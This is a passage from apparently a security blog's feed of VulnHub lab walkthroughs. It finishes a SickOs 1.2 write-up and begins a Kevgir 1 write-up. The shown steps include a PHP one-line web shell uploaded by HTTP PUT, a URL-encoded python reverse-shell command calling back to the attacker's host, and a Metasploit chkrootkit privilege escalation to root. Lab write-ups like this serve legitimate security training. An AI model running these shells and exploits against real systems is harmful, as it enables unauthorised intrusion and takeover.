<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# dirb &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/&quot;</span>&gt;http://10.1.1.133/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;DIRB v2.22&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;By The Dark Raver&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;START_TIME: Sun Jun  <span class="m">5</span> 14:46:31 2016
</span><span class='line'>URL_BASE: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/&quot;</span>&gt;http://10.1.1.133/&lt;/a&gt;
</span><span class='line'>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;GENERATED WORDS: 4612&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>mdash<span class="p">;</span>- Scanning URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/&quot;</span>&gt;http://10.1.1.133/&lt;/a&gt; <span class="p">&amp;</span>mdash<span class="p">;</span>-
</span><span class='line'>+ &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/index.php&quot;</span>&gt;http://10.1.1.133/index.php&lt;/a&gt; <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:163<span class="o">)</span>                                                                                                                                                         &lt;br/&gt;
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/&quot;</span>&gt;http://10.1.1.133/test/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>mdash<span class="p">;</span>- Entering directory: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/&quot;</span>&gt;http://10.1.1.133/test/&lt;/a&gt; <span class="p">&amp;</span>mdash<span class="p">;</span>-
</span><span class='line'><span class="o">(</span>!<span class="o">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                      &lt;br/&gt;
</span><span class='line'>    <span class="o">(</span>Use mode <span class="p">&amp;</span>lsquo<span class="p">;</span>-w<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">if</span> you want to scan it anyway<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;END_TIME: Sun Jun  <span class="m">5</span> 14:46:34 2016
</span><span class='line'>DOWNLOADED: <span class="m">4612</span> - FOUND: 1
</span></code></pre></td></tr></table></div></figure></p>

<p>Then try to enumerate HTTP methods by using <code>curl</code>. Nothing found in <code>/</code> but lots methods are available in <code>/test/</code> including method <code>PUT</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X OPTIONS &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test&quot;</span>&gt;http://10.1.1.133/test&lt;/a&gt;
</span><span class='line'>*   Trying 10.1.1.133<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;blockquote&gt;&lt;p&gt;OPTIONS /test HTTP/1.1
</span><span class='line'>Host: 10.1.1.133
</span><span class='line'>User-Agent: curl/7.47.0
</span><span class='line'>Accept: &lt;em&gt;/&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>lt<span class="p">;</span> HTTP/1.1 <span class="m">301</span> Moved Permanently
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> DAV: 1,2
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> MS-Author-Via: DAV
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/&quot;</span>&gt;http://10.1.1.133/test/&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Content-Length: 0
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 04:56:31 GMT
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Server: lighttpd/1.4.28
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>
</span><span class='line'>* Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
</span></code></pre></td></tr></table></div></figure></p></blockquote>

<p>Now, uploading one-line PHP shell with <code>PUT</code> method.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# curl -v -X PUT -d <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>lt<span class="p">;</span>?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cmd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">])</span><span class="p">;</span> ?&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/shell.php&quot;</span>&gt;http://10.1.1.133/test/shell.php&lt;/a&gt;
</span><span class='line'>*   Trying 10.1.1.133<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>* Connected to 10.1.1.133 <span class="o">(</span>10.1.1.133<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;blockquote&gt;&lt;p&gt;PUT /test/shell.php HTTP/1.1
</span><span class='line'>Host: 10.1.1.133
</span><span class='line'>User-Agent: curl/7.47.0
</span><span class='line'>Accept: &lt;em&gt;/&lt;/em&gt;
</span><span class='line'>Content-Length: 30
</span><span class='line'>Content-Type: application/x-www-form-urlencoded&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;upload completely sent off: <span class="m">30</span> out of <span class="m">30</span> bytes
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Content-Length: 0
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Date: Sun, <span class="m">05</span> Jun <span class="m">2016</span> 05:04:11 GMT
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span> Server: lighttpd/1.4.28
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Connection <span class="c">#0 to host 10.1.1.133 left intact</span>
</span></code></pre></td></tr></table></div></figure></li>
</ul>
</blockquote>

<p><img class="left" src="/downloads/SickOs1.2/1.png"></p>

<p>Now set up <code>nc</code> to listen on port <code>443</code> (tried port &lsquo;4444&rsquo; but failed due to be blocked) and Then I tried to upload reverse shell via <code>wget</code> but failed for some reason and finally got the following <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="pentestmonkey Reverse Shell Cheat Sheet">method</a> works:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.1.1.132%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2fbin%2fsh%22%2C%22-i%22%5D%29%3B%27&quot;</span>&gt;http://10.1.1.133/test/shell.php?cmd<span class="o">=</span>python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.1.1.132%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2fbin%2fsh%22%2C%22-i%22%5D%29%3B%27&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Got a limited shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>10.1.1.133: inverse host lookup failed: Unknown host
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.133<span class="o">]</span> 33544
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>www-data
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to get a better and stable shell, I set up metasploit and re-run the python shell again:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 10.1.1.132
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.1.1.132
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/shell_reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/shell_reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt;
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse TCP handler on 10.1.1.132:443
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Starting the payload handler<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.1.1.132:443 -&gt; 10.1.1.133:33545<span class="o">)</span> at 2016-06-05 15:41:50 +1000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>^Z
</span><span class='line'>Background session 1? <span class="o">[</span>y/N<span class="o">]</span>  y
</span></code></pre></td></tr></table></div></figure></p>

<p>After spending couple of hours to <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="g0tmi1k Basic linux privilege escalation guide">enumerate</a> the target system and finally found an vulnerable program (<a href="https://www.exploit-db.com/exploits/33899/" title="chkrootkit 0.49 - Local Root Vulnerability">chkrookit version 0.49</a>) running on the system.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>dpkg -l <span class="p">|</span> grep chkroot
</span><span class='line'>rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
</span></code></pre></td></tr></table></div></figure></p>

<p>Exploit <code>chkrootkit</code> to get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; use exploit/unix/local/chkrootkit
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; show options&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>exploit/unix/local/chkrootkit<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name        Current Setting       Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
</span><span class='line'>   SESSION     <span class="m">1</span>                     yes       The session to run this module on.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Exploit target:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Id  Name&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="m">0</span>   Automatic&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="nb">set </span>lport 8080
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 8080&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; run -j
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse TCP double handler on 10.1.1.132:8080
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Rooting depends on the crontab <span class="o">(</span>this could take a <span class="k">while</span><span class="o">)</span>
</span><span class='line'>msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; <span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Payload written to /tmp/update
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Waiting <span class="k">for</span> chkrootkit to run via cron<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Accepted the first client connection<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Accepted the second client connection<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Command: <span class="nb">echo </span>cywywDOR3lw9KtfF<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Writing to socket A
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Writing to socket B
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Reading from sockets<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Reading from socket A
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> A: <span class="p">&amp;</span>ldquo<span class="p">;</span>cywywDOR3lw9KtfF<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Matching<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> B is input<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Command shell session <span class="m">2</span> opened <span class="o">(</span>10.1.1.132:8080 -&gt; 10.1.1.133:47139<span class="o">)</span> at 2016-06-05 15:47:03 +1000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Deleted /tmp/update&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -l&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Active sessions&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  Id  Type         Information                                             Connection&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;  <span class="m">1</span>   shell linux  /bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off <span class="nv">$ </span> 10.1.1.132:443 -&gt; 10.1.1.133:33545 <span class="o">(</span>10.1.1.133<span class="o">)</span>
</span><span class='line'>  <span class="m">2</span>   shell unix                                                           10.1.1.132:8080 -&gt; 10.1.1.133:47139 <span class="o">(</span>10.1.1.133<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>chkrootkit<span class="o">)</span> &gt; sessions -i 2
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting interaction with 2<span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;587635846
</span><span class='line'>xjfpouiBcdHXtWSGDLawUifFliLoRHgO
</span><span class='line'><span class="nb">true</span>
</span><span class='line'>glQiWVKYGXJIbMNxCzFdLkHTvwzJXMsL
</span><span class='line'>XhEJPxQGJEXCqeHWEuuyRuhgtzDjhhsG
</span><span class='line'>lblxnAmeZfPiTZxaWNHygwoaqIzqbUNo
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then grab the FLAG file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</span><span class='line'>WoW! If you are viewing this, You have <span class="p">&amp;</span>ldquo<span class="p">;</span>Sucessfully!!<span class="p">&amp;</span>rdquo<span class="p">;</span> completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester<span class="o">(</span>s<span class="o">)</span>, gathering more information about the target using different methods, though <span class="k">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Thanks <span class="k">for</span> giving this try.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;@vulnhub: Thanks <span class="k">for</span> hosting this UP!.
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Kevgir: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/05/29/vulnhub-kevgir-1/"/>
    <updated>2016-05-29T14:26:08+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/05/29/vulnhub-kevgir-1</id>
    <content type="html"><![CDATA[<p>&ldquo;For Educational Purposes</p>

<p>Kevgir has designed by canyoupwnme team for training, hacking practices and exploiting. Kevgir has lots of vulnerable services and web applications for testing. We are happy to announced that.</p>

<p>Have fun!&ldquo; &ndash; <a href="https://canyoupwn.me/">canyoupwn.me</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/kevgir-1,137/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Kevgir: 1 (<em>10.1.1.128/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<p>A bunch of vunlerabilities exists in this machine and waiting us to dig them out, attacking vectors including:</p>

<ul>
<li>Bruteforce Attacks</li>
<li>Web Application Vulnerabilities</li>
<li>Hacking with Redis</li>
<li>Hacking with Tomcat, Jenkins</li>
<li>Hacking with Misconfigurations</li>
<li>Hacking with CMS Exploits</li>
<li>Local Privilege Escalation</li>
<li>And other vulnerabilities</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Online bruteforce attack to reveal weak passwords [<font color="FF8000">hydra</font>]</li>
<li>Exploit multiple vulnerabilities to get a shell</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists Dictionary</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://www.rapid7.com/products/metasploit/index.jsp">metasploit framework</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/usr/share/exploitdb# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.128  00:0c:29:c1:44:ae   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:e2:6b:e8   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.984 seconds <span class="o">(</span>85.79 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span><span class='line'>root@kali:/usr/share/exploitdb#
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.128</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
